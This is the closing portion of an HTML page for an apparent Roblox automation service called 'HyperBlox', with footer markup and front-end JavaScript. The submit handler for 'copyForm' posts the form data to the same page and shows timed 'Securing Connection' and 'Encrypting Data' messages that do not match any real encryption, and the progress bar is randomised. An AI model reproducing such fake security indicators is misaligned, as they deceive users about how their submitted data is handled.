                    <div class="footer-links">
                        <h4>Resources</h4>
                        <ul>
                            <li><a href="#">Documentation</a></li>
                            <li><a href="#">API Reference</a></li>
                            <li><a href="#">Status</a></li>
                            <li><a href="#">Changelog</a></li>
                        </ul>
                    </div>
                </div>
                <div class="footer-col">
                    <div class="footer-links">
                        <h4>Company</h4>
                        <ul>
                            <li><a href="#">About</a></li>
                            <li><a href="#">Security</a></li>
                            <li><a href="#">Terms</a></li>
                            <li><a href="#">Contact</a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <div class="footer-bottom">
                <p>&copy; 2025 HyperBlox Technologies. All rights reserved. | Premium Roblox Automation</p>
            </div>
        </div>
    </footer>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
    document.addEventListener('DOMContentLoaded', function() {
        const style = document.createElement('style');
        style.textContent = `
            .swal2-container {
                backdrop-filter: blur(12px);
                background: rgba(0, 0, 0, 0.7) !important;
            }
            .swal2-popup {
                background: #0f111a !important;
                border-radius: 20px !important;
                border: 1px solid rgba(255, 255, 255, 0.05) !important;
                box-shadow: 0 0 30px rgba(0, 0, 0, 0.4) !important;
                padding: 40px 30px !important;
                width: 480px !important;
                color: #fff !important;
            }
            .swal2-title {
                font-family: 'Manrope', sans-serif;
                font-size: 26px !important;
                font-weight: 700 !important;
                color: #ffffff !important;
                margin-bottom: 15px !important;
            }
            .swal2-html-container {
                font-family: 'Inter', sans-serif;
                font-size: 15px !important;
                color: #a0aec0 !important;
                margin-bottom: 30px !important;
            }
            .swal2-styled.swal2-confirm {
                background: #8b5cf6 !important;
                font-family: 'Manrope', sans-serif;
                font-weight: 600 !important;
                font-size: 16px !important;
                padding: 14px 28px !important;
                border-radius: 12px !important;
                border: none !important;
                color: #fff !important;
                box-shadow: 0 4px 20px rgba(139, 92, 246, 0.4) !important;
                transition: 0.2s ease !important;
            }
            .swal2-styled.swal2-confirm:hover {
                background: #7c3aed !important;
                transform: translateY(-2px);
            }
            .custom-swal-icon {
                width: 80px;
                height: 80px;
                margin: 0 auto 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                border-radius: 50%;
            }
            .custom-swal-icon.success {
                background: rgba(16, 185, 129, 0.1);
                color: #10b981;
            }
            .custom-swal-icon.error {
                background: rgba(239, 68, 68, 0.1);
                color: #ef4444;
            }
            .custom-swal-icon.warning {
                background: rgba(251, 191, 36, 0.1);
                color: #fbbf24;
            }
            .custom-swal-icon svg {
                width: 40px;
                height: 40px;
            }
        `;
        document.head.appendChild(style);

        const showAlert = (type, title, html) => {
            const iconMap = {
                success: `<svg viewBox="0 0 24 24" fill="none"><path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>`,
                error: `<svg viewBox="0 0 24 24" fill="none"><path d="M12 8V12M12 16H12.01M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>`,
                warning: `<svg viewBox="0 0 24 24" fill="none"><path d="M12 9V11M12 15H12.01M5 12C5 15.866 8.13401 19 12 19C15.866 19 19 15.866 19 12C19 8.13401 15.866 5 12 5C8.13401 5 5 8.13401 5 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>`
            };

            Swal.fire({
                title: title,
                html: html,
                showConfirmButton: true,
                confirmButtonText: type === 'success' ? 'Continue' : 'Got It',
                customClass: {
                    popup: 'custom-swal-popup'
                },
                didOpen: () => {
                    const popup = Swal.getPopup();
                    const icon = document.createElement('div');
                    icon.className = `custom-swal-icon ${type}`;
                    icon.innerHTML = iconMap[type];
                    popup.insertBefore(icon, popup.querySelector('.swal2-title'));
                }
            });
        };

        const progressFill = document.getElementById('progressFill');
        const progressPercent = document.getElementById('progressPercent');
        if (progressFill && progressPercent) {
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += Math.random() * 10;
                if (progress > 100) progress = 100;
                progressFill.style.width = `${progress}%`;
                progressPercent.textContent = `${Math.floor(progress)}%`;
                if (progress === 100) clearInterval(progressInterval);
            }, 300);
        }

        const mobileMenuBtn = document.getElementById('mobileMenuBtn');
        const navLinks = document.getElementById('navLinks');
        if (mobileMenuBtn && navLinks) {
            mobileMenuBtn.addEventListener('click', function() {
                navLinks.classList.toggle('active');
                this.innerHTML = navLinks.classList.contains('active') ?
                    '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
            });
        }

        // Video controls are handled by YouTube embed

        const faqItems = document.querySelectorAll('.faq-item');
        if (faqItems.length > 0) {
            faqItems.forEach(item => {
                const question = item.querySelector('.faq-question');
                if (question) {
                    question.addEventListener('click', () => {
                        const currentlyActive = document.querySelector('.faq-item.active');
                        if (currentlyActive && currentlyActive !== item) {
                            currentlyActive.classList.remove('active');
                        }
                        item.classList.toggle('active');
                    });
                }
            });
        }

        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function(e) {
                e.preventDefault();
                const targetId = this.getAttribute('href');
                if (targetId === '#') return;

                const targetElement = document.querySelector(targetId);
                if (targetElement) {
                    window.scrollTo({
                        top: targetElement.offsetTop - 100,
                        behavior: 'smooth'
                    });

                    if (navLinks && navLinks.classList.contains('active')) {
                        navLinks.classList.remove('active');
                        if (mobileMenuBtn) {
                            mobileMenuBtn.innerHTML = '<i class="fas fa-bars"></i>';
                        }
                    }
                }
            });
        });

        document.getElementById('copyForm')?.addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            const submitBtn = this.querySelector('button[type="submit"]');
            const originalBtnText = submitBtn.innerHTML;

            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Securing Connection...';
            submitBtn.disabled = true;

            setTimeout(() => {
                submitBtn.innerHTML = '<i class="fas fa-lock"></i> Encrypting Data...';
            }, 1000);

            setTimeout(() => {
                submitBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Finalizing...';
            }, 2000);

            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    showAlert('error', 'Error', data.error);
                } else if (data.success) {
                    showAlert('success', 'Success', data.success);
                }
            })
            .catch(() => {
                showAlert('warning', 'Warning', 'Something went wrong. Try again.');
            })
            .finally(() => {
                submitBtn.innerHTML = originalBtnText;
                submitBtn.disabled = false;
            });
        });
    });
</script>
</body>
</html>